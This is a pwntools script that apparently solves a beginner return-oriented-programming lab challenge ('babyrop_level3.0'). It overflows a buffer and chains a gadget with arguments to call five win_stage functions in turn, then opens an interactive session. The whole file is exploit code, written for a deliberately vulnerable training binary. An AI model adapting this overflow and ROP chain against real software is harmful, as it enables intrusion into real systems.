from pwn import *
# Init
elf = ELF("/challenge/babyrop_level3.0")
context.arch = "amd64"
context.endian = "little"


# Vars
buffer_length = 60 + 4 + 8 # local_48 and variable int 4 byte (local_c) + EBP
gadget_addr = p64(0x0000000000402a23)

param1 = p64(0x1)
stage_1_address = p64(elf.symbols.win_stage_1)

param2 = p64(0x2)
stage_2_address = p64(elf.symbols.win_stage_2)

param3 = p64(0x3)
stage_3_address = p64(elf.symbols.win_stage_3)

param4 = p64(0x4)
stage_4_address = p64(elf.symbols.win_stage_4)

param5 = p64(0x5)
stage_5_address = p64(elf.symbols.win_stage_5)

io = elf.process()

# Payload
payload = b"A"*buffer_length + gadget_addr + param1 + stage_1_address + gadget_addr + param2 + stage_2_address + gadget_addr + param3 + stage_3_address + gadget_addr + param4 + stage_4_address + gadget_addr + param5 + stage_5_address

# Action
io.sendline(payload)
io.interactive()